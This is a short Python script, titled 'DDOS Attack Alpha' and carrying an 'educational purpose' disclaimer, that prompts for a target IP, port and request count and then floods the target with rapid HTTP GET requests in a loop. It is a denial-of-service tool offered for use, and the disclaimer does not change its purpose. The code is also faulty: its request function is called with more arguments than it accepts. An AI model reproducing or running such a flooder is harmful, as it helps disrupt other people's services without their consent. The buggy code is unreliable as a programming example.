import pyfiglet
from colorama import Fore, Style, init
import requests
import time

# Initialize Colorama
init(autoreset=True)

def print_attractive_text():
    # Create a Figlet font object
    title_font = pyfiglet.Figlet(font='slant')
    subtitle_font = pyfiglet.Figlet(font='small')

    # Define the text
    title = "DDOS Attack Alpha"
    subtitle = "Made by JUNAYAD AHSAN"
    description = "DDOS Attack Alpha"

    # Print the title in big letters
    print(Fore.CYAN + title_font.renderText(title))
    print(Fore.YELLOW + subtitle_font.renderText(subtitle))
    print(Fore.GREEN + f"This code is made for {Style.BRIGHT}educational purpose.")
    print(Fore.MAGENTA + f"By this code, people can know about {Style.BRIGHT}{description}.")
    print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")

def send_request(ip):
    try:
        # Assuming you want to send a request to a specific port on the IP
        url = f'http://{ip}:{port}'  # You can specify a port if needed, e.g., http://{ip}:80
        response = requests.get(url)
        if response.status_code == 200:
            print(Fore.GREEN + "Request sent to", ip)
        else:
            print(Fore.YELLOW + "Request failed with status code:", response.status_code)
    except Exception as e:
        print(Fore.RED + "An error occurred:", str(e))

if __name__ == "__main__":
    print_attractive_text()
    
    n = int(input("How many times do you want to send requests?: "))
    ip = input('Input your target IP address: ')
    port = input('Input the target port (e.g., 80 for HTTP, 443 for HTTPS): ')

    for _ in range(n):
        send_request(ip ,port)
        time.sleep(0.0001)  # Be cautious with the sleep time to avoid overwhelming the target